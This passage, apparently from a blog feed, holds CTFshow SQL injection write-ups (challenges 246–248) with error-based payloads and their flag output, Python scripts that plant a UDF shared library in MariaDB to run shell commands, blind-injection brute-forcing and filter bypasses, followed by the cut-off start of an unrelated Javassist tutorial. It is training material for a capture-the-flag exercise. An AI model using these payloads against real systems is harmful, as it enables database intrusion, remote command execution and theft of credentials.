<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml</span></span><br></pre></td></tr></table></figure></div>



<h2 id="246（updatexml和extractvalue-被ban）"><a href="#246（updatexml和extractvalue-被ban）" class="headerlink" title="246（updatexml和extractvalue 被ban）"></a>246（updatexml和extractvalue 被ban）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue</span></span><br></pre></td></tr></table></figure></div>



<h3 id="floor注入"><a href="#floor注入" class="headerlink" title="floor注入"></a>floor注入</h3><p>注入原理：<a class="link"   href="https://www.freebuf.com/column/235496.html" >Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>payload（就是注意我们使用了floor，和concat，拿到的结果要去除最后一个数字（那是拼接上的floor））</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 查数据表</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow_flags1&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查字段</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;Duplicate entry &#x27;</span>flag21<span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># 查字段值</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow&#123;8744ed07-7a96-49e9-b64c-89896a8f939c&#125;1&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br></pre></td></tr></table></figure></div>





<h2 id="247（floor也无了）"><a href="#247（floor也无了）" class="headerlink" title="247（floor也无了）"></a>247（floor也无了）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue floor</span></span><br></pre></td></tr></table></figure></div>

<p>有过滤的报错注入，这次新增禁用 <code>floor</code>，还可以用 ceil 代替（和floor是反着来的，但是本质上利用floor的点没变，改floor为ceil即可）。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 查数据表</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow_flagsa2&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查字段(注意这里flag? 中有? 所以要用反引号包裹起来，免得被当成url处理了)</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;Duplicate entry &#x27;</span>flag?<span class="number">2</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># 查字段值</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow&#123;22489aed-e513-475e-96f5-985a6eaf43c0&#125;2&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select `flag?` from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br></pre></td></tr></table></figure></div>



<h1 id="udf-注入"><a href="#udf-注入" class="headerlink" title="udf 注入"></a>udf 注入</h1><h2 id="知识学习-1"><a href="#知识学习-1" class="headerlink" title="知识学习"></a>知识学习</h2><p>参考文章： <a class="link"   href="https://blog.csdn.net/qq_35938621/article/details/119716077" >(37条消息) 【SQL注入】UDF提权命令执行_孤桜懶契的博客-CSDN博客_sqlmap udf提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p><strong>1 查看可操作路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;%secure%&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>2 查看plugin目录路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin_dir</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>这篇文章讲的肥肠清楚，这里只写了一点点</p>
<h2 id="248"><a href="#248" class="headerlink" title="248"></a>248</h2><p><strong>mysql的UAF注入,简单来说就是把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.so&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>导入udf函数</span><br></pre></td></tr></table></figure></div>



<p><strong>题目</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line">(测试发现还是有过滤的，有<span class="keyword">or</span>、<span class="keyword">and</span>之类的，所以我们就用不了盲注等方法了。md狗比又不说waf，现在正常手段没用了)</span><br></pre></td></tr></table></figure></div>



<p>看题目加上测试，发现存在堆叠注入</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;select version();#</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;version()&quot;:&quot;10.3.18-MariaDB&quot;&#125;]&#125;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>看一下可操作路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show global variables like &quot;%secure%&quot;;#</span></span><br></pre></td></tr></table></figure></div>

<p><strong>发现</strong></p>
<blockquote>
<p>{“Variable_name”:”secure_auth”,”Value”:”ON”},{“Variable_name”:”secure_file_priv”,”Value”:””},{“Variable_name”:”secure_timestamp”,”Value”:”NO”}]}</p>
</blockquote>
<p><code>@@secure_file_priv: null</code>不能写入文件，所以写木马的方式也失效了，要是能提权写文件就好了</p>
<p><strong>接着看看plugin目录路径</strong></p>
<blockquote>
<p>{“@@plugin_dir”:”/usr/lib/mariadb/plugin/“}]}</p>
</blockquote>
<p>目录&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</p>
<p>具体手操见上面学习文章中的步骤</p>
<p>这里放个脚本（靶机是linux的，url和文件目录根据需要进行修改）</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;?id=1&#x27;;select &#x27;&#123;&#125;&#x27; into dumpfile &#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;--+&quot;</span></span><br><span class="line">acquire = <span class="string">&quot;?id=1&#x27;;select load_file(&#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;)--+&quot;</span></span><br><span class="line">text = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"></span><br><span class="line">udf=<span class="string">&quot;&quot;</span></span><br><span class="line">udf_text=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20000</span>,<span class="number">5000</span>):</span><br><span class="line">    end = i+<span class="number">5000</span></span><br><span class="line">    udf_text.append(udf[i:end])</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">dict</span>(<span class="built_in">zip</span>(text,udf_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> text:</span><br><span class="line">    param=payload.<span class="built_in">format</span>(p[t],t)</span><br><span class="line">    get_url = url + param</span><br><span class="line">    res = requests.get(get_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    code = res.status_code</span><br><span class="line">    <span class="built_in">print</span>(code,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>  code==<span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你输入的URL可能出错&quot;</span>)</span><br><span class="line">    acq=acquire.<span class="built_in">format</span>(t)</span><br><span class="line">    data=url+acq</span><br><span class="line">    res = requests.get(url=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;load_file&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;--&gt;成功插入&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]导入udf.so成功&quot;</span>)</span><br><span class="line">url_sys_dll = <span class="string">&quot;?id=1%27;select unhex(concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27; --+&quot;</span></span><br><span class="line">res= requests.get(url=url+url_sys_dll)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]创建函数sys_eval()成功&quot;</span>)</span><br><span class="line">url_sys_function = <span class="string">&quot;?id=1%27;create function sys_eval returns string soname &#x27;udf.so&#x27;--+&quot;</span></span><br><span class="line">res= requests.get(url=url+url_sys_function)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]命令执行结果: &quot;</span>)</span><br><span class="line">sys_eval=<span class="string">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag.*&#x27;)--+&quot;</span></span><br><span class="line">res= requests.get(url=url+sys_eval)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<p><strong>还有另外的师傅写了个脚本</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c4cfac67-eec1-4378-ac1b-75c52840f816.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#xx27;</span></span><br><span class="line">codes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i + <span class="number">128</span>, <span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commit_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>):</span><br><span class="line">    requests.get(url + <span class="string">f&#x27;&#x27;&#x27;0&#x27;;<span class="subst">&#123;payload&#125;</span>;-- A&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次运行建临时表</span></span><br><span class="line"><span class="comment"># sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空临时表</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入第一段数据</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(codes)):</span><br><span class="line">    commit_payload(<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.3.18-MariaDB</span></span><br><span class="line"><span class="comment"># 写入so文件</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入自定义函数</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行，结果更新到界面</span></span><br><span class="line">commit_payload(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.????&#x27;))&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">r = requests.get(url[:-<span class="number">4</span>] + <span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>



<p><strong>两个脚本都跑了一次，都ok，第一个要快些</strong></p>
<h1 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h1><p>Quine指的是自产生程序，简单的说，就是输入的sql语句与要输出的一致，下面是例题。</p>
<p>（比如，输入的password和数据库中存储的一样的时候才会输出flag）</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28457/index.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 使用前先看看过滤的内容有哪些</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;-1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag + j&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>









<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><h2 id="web249-253"><a href="#web249-253" class="headerlink" title="web249 -253"></a>web249 -253</h2><p>nosql我还没学，待补充</p>
<p><a class="link"   href="https://www.cnblogs.com/recharging-runtime/p/15077477.html" >CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="练题补充"><a href="#练题补充" class="headerlink" title="练题补充"></a>练题补充</h1><h2 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h2><p><strong>有回显</strong></p>
<p>原本union正常语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_id,user,password from users union select 1,2,3;</span><br></pre></td></tr></table></figure></div>

<p>使用join绕过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_id,user,password from users union select * from ((select 1)A join (select 2)B join (select 3)C);</span><br></pre></td></tr></table></figure></div>



<h5 id="盲注中逗号绕过"><a href="#盲注中逗号绕过" class="headerlink" title="盲注中逗号绕过"></a>盲注中逗号绕过</h5><p>逗号绕过 SUBTTRING 函数<br>substring(str FROM pos)<br>从字符串str的起始位置pos 返回一个子串</p>
<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function">union <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="title">substring</span>(<span class="params">(<span class="keyword">select</span> password <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">&#x27;root&#x27;</span></span>) <span class="keyword">from</span> 1 <span class="keyword">for</span> 1)</span>=<span class="string">&#x27;e&#x27;</span> <span class="function">then <span class="title">sleep</span>(<span class="params"><span class="number">5</span></span>) <span class="keyword">else</span> 0 end #</span></span><br></pre></td></tr></table></figure></div>







]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>javassist 学习记录</title>
    <url>/2024/03/08/blog_javassist%20%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>之前看到过一些相关内容，最近稍微学了点基础记录了一下。</p>

  </div>

<h2 id="javassist-简介"><a href="#javassist-简介" class="headerlink" title="javassist 简介"></a>javassist 简介</h2><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。</p>
<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。</p>
<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
<h2 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h2><p>可以把它理解成加强版的<code>Class</code>对象，需要从<code>ClassPool</code>中获得。</p>
<p>获得方法：<code>CtClass cc = cp.get(ClassName)</code>。</p>
<p><strong>AbstractClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InterfaceClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterfaceClass</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>CtClass_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Bean.AbstractClass;</span><br><span class="line"><span class="keyword">import</span> Bean.InterfaceClass;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CtClass_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br><span class="line"><span class="comment">//        // 新建类</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = pool.makeClass(&quot;Ko1sh1&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        // 设置父类为抽象类</span></span><br><span class="line"><span class="comment">//        CtClass superClass = pool.get(AbstractClass.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上两步可直接合成为：</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建抽象 show 方法并添加</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show()&#123;String name=\&quot;koishi\&quot;;System.out.println(name);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 CtClass 的方式获取接口并添加方法</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">interfaceCtClass</span> <span class="operator">=</span> pool.makeInterface(InterfaceClass.class.getName());</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">interface_method</span> <span class="operator">=</span> CtNewMethod.abstractMethod(CtClass.voidType, <span class="string">&quot;show2&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>, interfaceCtClass);</span><br><span class="line">        interfaceCtClass.addMethod(interface_method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再为原本的类添加一个接口</span></span><br><span class="line">        ctClass.addInterface(interfaceCtClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接口实现抽象方法的方式与抽象类的函数相同</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show2() &#123; System.out.println(\&quot;Implemented method\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存class文件</span></span><br><span class="line"><span class="comment">//        String savePath = &quot;src/main/java/class_repository/Bean/class_repository&quot;;</span></span><br><span class="line"><span class="comment">//        ctClass.writeFile(savePath);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            